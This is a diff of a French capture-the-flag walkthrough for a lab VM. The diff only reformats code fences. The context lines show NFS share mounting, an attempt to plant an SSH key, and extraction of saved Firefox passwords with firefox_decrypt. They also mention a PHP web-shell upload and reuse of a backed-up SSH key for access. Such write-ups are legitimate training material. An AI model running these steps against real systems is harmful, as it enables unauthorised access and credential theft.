@@ -10,7 +10,7 @@ High Jack
 
 On a aussi ce conseil si jamais on est bloqué : *A cewl tool can help you get past a login page*.  
 
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.56.3 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.3 
@@ -66,7 +66,7 @@ On a beaucoup de ports liés aux services RPC. Evidemment seul NFS semble intér
 
 Il est temps de jeter un œil plus curieux sur les partages NFS :  
 
-```plain
+```
 $ showmount -e 192.168.56.3 
 Export list for 192.168.56.3: 
 /home/ch33s3m4n *
@@ -80,7 +80,7 @@ $ sudo mount 192.168.56.3:/home/ch33s3m4n /mnt/
 
 On est bien sûr tenté d'en profiter en rajoutant notre clé publique SSH dans les clés autorisées pour l'utilisateur :  
 
-```plain
+```
 cp ~/.ssh/id_rsa.pub /mnt/.ssh/authorized_keys 
 cp: impossible de créer le fichier standard '/mnt/.ssh/authorized_keys': Système de fichiers accessible en lecture seulement
 ```
@@ -89,7 +89,7 @@ Raté... En fouillant dans les fichiers on ne remarque rien de vraiment critique
 
 Étrangement il y a un dossier *.mozilla* avec les données de navigation de Firefox. Je les copie donc et tente d'extraire les potentiels mots de passes enregistrés avec [firefox\_decrypt](https://github.com/devl00p/firefox_decrypt) (j'ai forké le projet car le mainteneur ne souhaite pas maintenir une compatibilité avec les versions moins récentes de Python 3).  
 
-```plain
+```
 $ python3 firefox_decrypt.py /tmp/mozilla_dir/firefox/ 
 Select the Mozilla profile you wish to decrypt 
 1 -> q525c4g9.default 
@@ -100,7 +100,7 @@ ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
 
 Rien d'intéressant n'a été enregistré. On peut fouiller dans l'historique des pages navigués manuellement :  
 
-```plain
+```
 $ sqlite3 places.sqlite 
 SQLite version 3.36.0 2021-06-18 18:36:39 
 Enter ".help" for usage hints. 
@@ -163,14 +163,14 @@ Une fois mon shell PHP uploadé un petit click droit me permet de retrouver son 
 
 Je remarque deux utilisateurs non privilégiés sur le système :  
 
-```plain
+```
 ch33s3m4n:x:1000:1000:ch33s3m4n,,,:/home/ch33s3m4n:/bin/bash 
 crab:x:1001:1001::/home/crab:/bin/bash
 ```
 
 Le dernier dispose d'une TODO list intéressante :  
 
-```plain
+```
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/crab/todo.txt  
 1. Scold cheese for weak qdpm password (done) 
 2. Backup SSH keys to /var/backups 
@@ -184,7 +184,7 @@ Il y a en effet un fichier *key.bak* dans */var/backups*  qui correspond à la c
 
 Une fois connecté on remarque que l'utilisateur a des droits sudo pour un dossier sur lequel on a le contrôle :  
 
-```plain
+```
 crab@cheeseyjack:~$ sudo -l 
 Matching Defaults entries for crab on cheeseyjack: 
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
